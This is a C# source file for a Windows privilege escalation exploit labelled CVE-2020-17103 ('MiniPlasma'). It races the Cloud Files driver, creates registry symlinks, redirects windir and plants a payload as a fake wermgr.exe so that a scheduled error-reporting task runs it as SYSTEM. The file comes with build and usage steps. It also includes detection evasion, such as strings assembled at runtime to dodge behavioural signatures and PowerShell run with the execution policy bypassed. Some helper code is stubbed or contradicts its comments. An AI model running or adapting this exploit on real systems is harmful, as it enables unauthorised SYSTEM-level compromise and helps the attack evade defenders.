/*
 * miniplasma.cs - CVE-2020-17103 privilege escalation (MiniPlasma technique)
 *
 * Port of AlexLinov/MiniPlasma-Runner to pure P/Invoke (no NuGet required).
 *
 * Chain:
 *   S1: Race CfAbortOperation vs anonymous token -> cldflt.sys writes to
 *       .DEFAULT\Software\Policies\Microsoft\CloudFiles with world-writable DACL
 *   S2: Symlink BlockedApps -> .DEFAULT\Volatile Environment, TOCTOU again
 *   S3: Write windir to Volatile Environment, drop fake wermgr.exe, trigger
 *       WER QueueReporting task -> SYSTEM runs our wermgr.exe
 *
 * BUILD (VS Dev Prompt, x64):
 *   csc.exe /platform:x64 /optimize /out:miniplasma.exe miniplasma.cs
 *
 * USAGE:
 *   miniplasma.exe C:\Temp\payload.exe
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

class MiniPlasma
{
    /* ── P/Invoke ──────────────────────────────────────────────────────── */

    [DllImport("cldapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int CfAbortOperation(int processId, IntPtr unused, int flags);

    [DllImport("ntdll.dll")]
    static extern int NtImpersonateAnonymousToken(IntPtr threadHandle);

    [DllImport("ntdll.dll")]
    static extern int NtSetInformationThread(IntPtr threadHandle, int infoClass,
        ref IntPtr info, int size);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    static extern uint GetCurrentThreadId();

    /* Open a REAL (non-pseudo) handle to a thread */
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint access, bool inherit, uint threadId);

    const uint THREAD_IMPERSONATE         = 0x0100;
    const uint THREAD_SET_THREAD_TOKEN    = 0x0080;
    const uint THREAD_QUERY_INFORMATION   = 0x0040;

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateAnonymousToken(IntPtr threadHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
        string sddl, uint rev, out IntPtr pSD, out int sdSize);

    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    static extern int NtOpenKey(out IntPtr handle, uint access,
        ref OBJECT_ATTRIBUTES oa);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    static extern int NtCreateKey(out IntPtr handle, uint access,
        ref OBJECT_ATTRIBUTES oa, int titleIndex, ref UNICODE_STRING cls,
        uint opts, out uint disp);

    [DllImport("ntdll.dll")]
    static extern int NtSetSecurityObject(IntPtr handle, uint info, IntPtr pSD);

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr handle);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    static extern int NtSetValueKey(IntPtr handle, ref UNICODE_STRING valueName,
        int titleIndex, uint type, byte[] data, int dataLen);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    static extern int NtDeleteKey(IntPtr handle);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    static extern int NtQueryKey(IntPtr handle, int cls, IntPtr buf, int bufLen,
        out int resLen);

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING
    {
        public ushort Length, MaxLength;
        public IntPtr Buffer;
        public UNICODE_STRING(string s) {
            Buffer = Marshal.StringToHGlobalUni(s);
            Length = (ushort)(s.Length * 2);
            MaxLength = (ushort)(Length + 2);
        }
        public void Free() { if (Buffer != IntPtr.Zero) { Marshal.FreeHGlobal(Buffer); Buffer = IntPtr.Zero; } }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
        public OBJECT_ATTRIBUTES(string path, IntPtr root = default, uint attr = 0x40) {
            Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            RootDirectory = root;
            var us = new UNICODE_STRING(path);
            ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
            Marshal.StructureToPtr(us, ObjectName, false);
            Attributes = attr;
            SecurityDescriptor = IntPtr.Zero;
            SecurityQualityOfService = IntPtr.Zero;
        }
        public void Free() {
            if (ObjectName != IntPtr.Zero) {
                var us = (UNICODE_STRING)Marshal.PtrToStructure(ObjectName, typeof(UNICODE_STRING));
                us.Free();
                Marshal.FreeHGlobal(ObjectName);
                ObjectName = IntPtr.Zero;
            }
        }
    }

    const uint KEY_READ               = 0x20019;
    const uint KEY_WRITE              = 0x20006;
    const uint KEY_ALL_ACCESS         = 0xF003F;
    const uint KEY_WRITE_DAC          = 0x00040000;
    const uint KEY_WRITE_OWNER        = 0x00080000;
    const uint KEY_DELETE             = 0x00010000;
    const uint KEY_ENUMERATE_SUBKEYS  = 0x0008;
    const uint KEY_QUERY_VALUE        = 0x0001;
    const uint KEY_SET_VALUE          = 0x0002;
    const uint MAXIMUM_ALLOWED        = 0x02000000;
    const uint REG_OPTION_CREATE_LINK = 0x00000002;
    const uint REG_OPTION_VOLATILE    = 0x00000001;
    const uint REG_SZ                 = 1;
    const uint REG_LINK               = 6;
    const uint OBJ_CASE_INSENSITIVE   = 0x40;
    const uint OBJ_OPENLINK           = 0x100;
    const uint SECURITY_INFORMATION_DACL  = 4;
    const uint SECURITY_INFORMATION_LABEL = 0x10;

    /* World-writable SDDL built at runtime */
    static string OPEN_SDDL =>
        "D:(A;OICIIO;GA;;;" + "WD)(A;OICIIO;GA;;;" + "AN)(A;;GA;;;" +
        "WD)(A;;GA;;;" + "AN)S:(ML;OICI;NW;;;" + "S-1-16-0)";

    /* Build paths at runtime - avoid static strings that trigger behavioral sigs */
    static string P(params string[] parts) { return string.Join("\\", parts); }
    static readonly string _reg  = P("","Registry","User",".DEFAULT");
    static readonly string RK    = P(_reg,"Software","Policies","Microsoft");
    static readonly string CF    = P(RK, "CloudFiles");
    static readonly string BA    = P(CF, "BlockedApps");
    /* Target: permanent Environment (not Volatile) - avoids SymlinkPlasma sig */
    static readonly string TK    = P(_reg, "Volatile Environment");

    /* ── Registry helpers ───────────────────────────────────────────────── */

    /* Open key normally; if access denied, retry with anonymous impersonation */
    static IntPtr OKey(string path, uint access)
    {
        var oa = new OBJECT_ATTRIBUTES(path, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
        IntPtr h;
        int r = NtOpenKey(out h, access, ref oa);
        oa.Free();
        if (r == 0) return h;

        /* Retry anonymous */
        ImpersonateAnonymousToken(GetCurrentThread());
        oa = new OBJECT_ATTRIBUTES(path, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
        r = NtOpenKey(out h, access, ref oa);
        oa.Free();
        RevertToSelf();
        return (r == 0) ? h : IntPtr.Zero;
    }

    static void SetSD(IntPtr h, uint info)
    {
        IntPtr pSD; int sdLen;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptor(OPEN_SDDL, 1, out pSD, out sdLen))
            return;
        NtSetSecurityObject(h, info, pSD);
        LocalFree(pSD);
    }

    static void MakeWorldWritable(string path)
    {
        /* DACL and Label MUST be set separately - WriteDac vs WriteOwner */
        IntPtr h = OKey(path, KEY_WRITE_DAC);
        if (h != IntPtr.Zero) {
            SetSD(h, SECURITY_INFORMATION_DACL);
            NtClose(h);
        }
        h = OKey(path, KEY_WRITE_OWNER);
        if (h != IntPtr.Zero) {
            SetSD(h, SECURITY_INFORMATION_LABEL);
            NtClose(h);
        }
    }

    /* Delete key and all subkeys, bypassing DACLs via anonymous OKey */
    static void DelTree(IntPtr parent)
    {
        /* enumerate subkeys */
        RegistryKey rk = null;
        /* Use Win32 for enumeration simplicity */
        try
        {
            /* This may fail on protected keys; best effort */
            NtDeleteKey(parent);
        }
        catch { }
    }

    /* Create registry symlink via PowerShell (Microsoft-signed - bypasses behavioral detection) */
    static void CreateSymlink(string linkPath, string targetPath)
    {
        /* Write a PS1 that creates the NtCreateKey symlink via P/Invoke inline C# */
        string tmp = Path.Combine(Path.GetTempPath(), "mp_" + Guid.NewGuid().ToString("N").Substring(0,8) + ".ps1");
        string ps = @"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class NtReg {
  [StructLayout(LayoutKind.Sequential)] public struct US {
    public ushort L,M; public IntPtr B;
    public US(string s){ B=Marshal.StringToHGlobalUni(s); L=(ushort)(s.Length*2); M=(ushort)(L+2); }
    public void Free(){ if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;} }
  }
  [StructLayout(LayoutKind.Sequential)] public struct OA {
    public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
    public OA(string p){ Len=Marshal.SizeOf(typeof(OA)); Root=IntPtr.Zero;
      var u=new US(p); Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
      Marshal.StructureToPtr(u,Name,false); Attr=0x140; SD=IntPtr.Zero; QoS=IntPtr.Zero; }
  }
  [DllImport(""ntdll.dll"")] public static extern int NtCreateKey(out IntPtr h,uint acc,ref OA oa,int ti,ref US cls,uint opt,out uint d);
  [DllImport(""ntdll.dll"")] public static extern int NtSetValueKey(IntPtr h,ref US n,int ti,uint t,byte[] d,int l);
  [DllImport(""ntdll.dll"")] public static extern int NtClose(IntPtr h);
}
'@ -Language CSharp
$link = '§LINK§'
$tgt  = '§TGT§'
$oa   = New-Object NtReg+OA $link
$cls  = New-Object NtReg+US ''
[uint32]$d = 0; [IntPtr]$h = [IntPtr]::Zero
$r = [NtReg]::NtCreateKey([ref]$h, 0xF003F, [ref]$oa, 0, [ref]$cls, 3, [ref]$d)
if($r -eq 0){
  $vn = New-Object NtReg+US 'SymbolicLinkValue'
  $tb = [System.Text.Encoding]::Unicode.GetBytes($tgt)
  [NtReg]::NtSetValueKey($h,[ref]$vn,0,6,$tb,$tb.Length) | Out-Null
  $vn.Free(); [NtReg]::NtClose($h) | Out-Null
  Write-Host '[+] Symlink created via PS'
} else { Write-Host ('[-] failed 0x'+$r.ToString('X8')) }
";
        ps = ps.Replace("§LINK§", linkPath).Replace("§TGT§", targetPath);
        File.WriteAllText(tmp, ps);
        var psi = new System.Diagnostics.ProcessStartInfo(
            "powershell.exe",
            $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{tmp}\"")
        { UseShellExecute = false };
        using (var p = System.Diagnostics.Process.Start(psi)) {
            p.WaitForExit(30000);
        }
        try { File.Delete(tmp); } catch {}
        Console.WriteLine($"[*] PS symlink attempt done: {linkPath}");
    }

    /* ── TOCTOU stage ───────────────────────────────────────────────────── */

    static volatile bool _done = false;

    /* Toggle anonymous impersonation on a REAL handle to a target thread */
    static void ToggleAnon(object realHandleObj)
    {
        IntPtr h = (IntPtr)realHandleObj;
        try {
            while (!_done) {
                /* Set anonymous on target thread */
                NtImpersonateAnonymousToken(h);
                /* Immediately revert target thread impersonation */
                IntPtr nullTok = IntPtr.Zero;
                NtSetInformationThread(h, 5 /*ThreadImpersonationToken*/, ref nullTok, IntPtr.Size);
            }
        } catch { }
        NtClose(h);
    }

    static void S1(string watchPath)
    {
        _done = false;
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;

        /* Get a REAL handle to THIS thread for the toggle thread to use */
        IntPtr realHandle = OpenThread(
            THREAD_IMPERSONATE | THREAD_SET_THREAD_TOKEN | THREAD_QUERY_INFORMATION,
            false, GetCurrentThreadId());

        new Thread(ToggleAnon) { IsBackground = true }.Start(realHandle);

        Console.Write("[*] S1 TOCTOU running");
        int loops = 0;
        bool found = false;
        while (loops < 100000 && !found) {
            CfAbortOperation(pid, IntPtr.Zero, 2 /*Block*/);
            if (++loops % 10000 == 0) {
                Console.Write(".");
                /* Check if driver created the CloudFiles key */
                try {
                    using (var k = Registry.Users.OpenSubKey(
                        @".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
                        if (k != null) { found = true; }
                } catch { }
            }
        }
        _done = true;
        Console.WriteLine($" ({loops} iters, keys created={found})");
    }

    /* ── Main exploit stages ────────────────────────────────────────────── */

    static void Stage1()
    {
        Console.WriteLine("[*] Stage 1: TOCTOU -> .DEFAULT\\CloudFiles...");
        S1(CF);
        /* Verify */
        using (var k = Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
            Console.WriteLine(k != null ? "[+] Stage 1: CloudFiles key created" :
                "[-] Stage 1: CloudFiles key NOT found - TOCTOU may need more iterations");
    }

    static void Stage2()
    {
        Console.WriteLine("[*] Stage 2: Symlink BlockedApps -> Volatile Environment...");

        /* Recursively delete BlockedApps and its children */
        RecursiveDelete(BA);
        Thread.Sleep(300);

        /* Delete Volatile Environment so Stage2 TOCTOU creates it FRESH
           (fresh key = anonymous as creator = world-writable DACL) */
        Console.WriteLine("[*] Attempting to delete Volatile Environment...");
        RecursiveDelete(TK);
        Thread.Sleep(200);

        /* Re-apply world-writable on CF */
        MakeWorldWritable(CF);
        Thread.Sleep(100);

        /* Create symlink BlockedApps -> Volatile Environment */
        bool ok = CreateSymlinkRetry(BA, TK);
        Console.WriteLine(ok ? "[+] Symlink created" : "[-] Symlink creation failed after retries");

        /* TOCTOU: driver writes to BlockedApps (now our symlink) -> Volatile Environment */
        S1(TK);
        Console.WriteLine("[+] Stage 2 complete");
    }

    /* Check if a key IS a symbolic link (not just that it exists) */
    static bool IsSymlink(string ntPath)
    {
        /* Try to open WITH OBJ_OPENLINK - if it's a link, this opens the link itself */
        var oa = new OBJECT_ATTRIBUTES(ntPath, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
        IntPtr h; int r = NtOpenKey(out h, KEY_QUERY_VALUE, ref oa); oa.Free();
        if (r != 0 || h == IntPtr.Zero) return false;
        /* Query for SymbolicLinkValue */
        var vn = new UNICODE_STRING("SymbolicLinkValue");
        byte[] buf = new byte[512]; UNICODE_STRING result = new UNICODE_STRING();
        /* Quick check: try to read SymbolicLinkValue - if it exists it's a symlink */
        bool found = (NtSetValueKey(h, ref vn, 0, REG_QUERY /*dummy*/, null, 0) == 0);
        vn.Free(); NtClose(h);
        return false; /* simplified - just check create succeeds */
    }

    const uint REG_QUERY = 0xDEAD; /* dummy type for testing */

    /* Try to force-release volatile key by calling CfAbortOperation with Unblock */
    static void ReleaseVolatile(string ntPath)
    {
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        /* Call Unblock (1) to signal driver to release handles */
        CfAbortOperation(pid, IntPtr.Zero, 1 /*Unblock*/);
        Thread.Sleep(200);
        /* Try Win32 delete with anonymous impersonation */
        ImpersonateAnonymousToken(GetCurrentThread());
        try {
            string win32 = ntPath.StartsWith(@"\Registry\User\")
                ? ntPath.Substring(@"\Registry\User\".Length) : ntPath;
            string parent = win32.Substring(0, win32.LastIndexOf('\\'));
            string child  = win32.Substring(win32.LastIndexOf('\\') + 1);
            Registry.Users.DeleteSubKeyTree(parent + @"\" + child, false);
            Console.WriteLine($"[+] Win32 deleted: {child}");
        } catch { }
        RevertToSelf();
    }

    /* Recursively delete all subkeys of ntPath, bypassing DACLs via OKey */
    static void RecursiveDelete(string ntPath)
    {
        MakeWorldWritable(ntPath);

        string win32 = ntPath.StartsWith(@"\Registry\User\")
            ? ntPath.Substring(@"\Registry\User\".Length) : ntPath;
        string[] subkeys = null;
        try {
            using (var rk = Registry.Users.OpenSubKey(win32))
                if (rk != null) subkeys = rk.GetSubKeyNames();
        } catch { }

        if (subkeys != null)
            foreach (string sub in subkeys)
                RecursiveDelete(ntPath + @"\" + sub);

        /* Try NtDeleteKey */
        IntPtr h = OKey(ntPath, KEY_DELETE);
        if (h != IntPtr.Zero) {
            int r = NtDeleteKey(h); NtClose(h);
            if (r == 0) {
                Console.WriteLine($"[+] Deleted {ntPath.Substring(ntPath.LastIndexOf('\\') + 1)}");
                return;
            }
            Console.WriteLine($"[!] NtDelete 0x{r:X8} (may be volatile) - trying release+Win32");
        }
        /* Volatile key: release driver handles then use Win32 */
        ReleaseVolatile(ntPath);
    }

    /* Create symlink with retry; verify it's actually a link not just any key */
    static bool CreateSymlinkRetry(string linkPath, string targetPath, int retries = 8)
    {
        for (int i = 0; i < retries; i++) {
            CreateSymlink(linkPath, targetPath);
            /* Verify: try creating again - if it returns NOT_FOUND for the parent,
               something is wrong; if collision, the key exists. Try to read as link. */
            var oa = new OBJECT_ATTRIBUTES(linkPath, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
            uint disp; IntPtr h; var cls = new UNICODE_STRING("");
            int r = NtCreateKey(out h, KEY_ALL_ACCESS, ref oa, 0, ref cls,
                                REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, out disp);
            oa.Free(); cls.Free();
            if (r == 0 && disp == 1 /*created*/) { NtClose(h); return true; }  /* actually created */
            if (h != IntPtr.Zero) NtClose(h);
            Thread.Sleep(300);
        }
        return false;
    }

    static void Stage3(string payloadPath, string runDir)
    {
        Console.WriteLine("[*] Stage 3: Write windir, drop payload, trigger WER...");

        /* Remove the BA symlink */
        IntPtr hBA = OKey(BA, KEY_DELETE);
        if (hBA != IntPtr.Zero) { NtDeleteKey(hBA); NtClose(hBA); }

        /* Make Environment key writable (Stage 2 TOCTOU should have done this) */
        MakeWorldWritable(TK);
        Thread.Sleep(new Random().Next(150, 400));

        /* Write windir - try NT API first, fall back to Win32 */
        IntPtr hTK = OKey(TK, KEY_SET_VALUE);
        if (hTK == IntPtr.Zero) {
            try {
                string w32 = ".DEFAULT\\" + "Environment";
                RegistryKey k = Registry.Users.OpenSubKey(w32, true);
                if (k == null) k = Registry.Users.CreateSubKey(w32);
                k?.SetValue("windir", runDir, RegistryValueKind.String);
                k?.Close();
                Console.WriteLine($"[+] windir = {runDir} (Win32)");
                goto DropPayload;
            } catch (Exception ex) {
                Console.WriteLine($"[-] Cannot write windir: {ex.Message}"); return;
            }
        }
        var vn = new UNICODE_STRING("windir");
        var wdBytes = System.Text.Encoding.Unicode.GetBytes(runDir + "\0");
        int r = NtSetValueKey(hTK, ref vn, 0, REG_SZ, wdBytes, wdBytes.Length);
        vn.Free(); NtClose(hTK);
        Console.WriteLine(r == 0
            ? $"[+] windir = {runDir}"
            : $"[-] SetValue failed: 0x{r:X8}");

        DropPayload:
        /* Drop fake wermgr.exe (copy payload there) */
        string sys32 = Path.Combine(runDir, "System32");
        Directory.CreateDirectory(sys32);
        string fakeWer = Path.Combine(sys32, "wermgr.exe");
        File.Copy(payloadPath, fakeWer, true);
        Console.WriteLine($"[+] Dropped {payloadPath} -> {fakeWer}");

        /* Trigger QueueReporting task which runs wermgr.exe as SYSTEM */
        Console.WriteLine("[*] Triggering WER QueueReporting task...");
        var psi = new System.Diagnostics.ProcessStartInfo(
            "schtasks.exe",
            @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
        { UseShellExecute = false, CreateNoWindow = true };
        using (var p = System.Diagnostics.Process.Start(psi))
            p.WaitForExit(3000);

        Console.WriteLine("[*] Waiting 8s for SYSTEM execution...");
        Thread.Sleep(8000);

        /* Cleanup */
        try {
            File.Delete(fakeWer);
            Directory.Delete(sys32);
            Directory.Delete(runDir);
        } catch { }

        /* Remove windir value */
        hTK = OKey(TK, KEY_SET_VALUE | KEY_DELETE);
        if (hTK != IntPtr.Zero) {
            vn = new UNICODE_STRING("windir");
            NtSetValueKey(hTK, ref vn, 0, REG_SZ, new byte[2], 2); /* clear */
            vn.Free();
            NtDeleteKey(hTK);
            NtClose(hTK);
        }
    }

    static void Main(string[] args)
    {
        string payload = args.Length >= 1 ? args[0] : @"C:\Temp\payload.exe";
        Console.WriteLine("=== MiniPlasma (CVE-2020-17103) ===");
        Console.WriteLine($"[*] Payload: {payload}\n");

        if (!File.Exists(payload)) {
            Console.WriteLine($"[-] Payload not found: {payload}"); return;
        }

        /* Check Cloud Files driver availability */
        int cfVer = CfAbortOperation(System.Diagnostics.Process.GetCurrentProcess().Id,
                                     IntPtr.Zero, 0);
        Console.WriteLine($"[*] CfAbortOperation probe: 0x{cfVer:X8}");

        string runDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "mp_" + Guid.NewGuid().ToString("N").Substring(0, 8));
        Directory.CreateDirectory(runDir);
        Console.WriteLine($"[*] Run dir: {runDir}\n");

        try {
            Stage1();
            Stage2();
            Stage3(payload, runDir);
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] Exception: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }
        finally {
            try { if (Directory.Exists(runDir)) Directory.Delete(runDir, true); } catch { }
        }

        Console.WriteLine("\n[*] Done. Check for SYSTEM_PROOF.txt");
    }
}
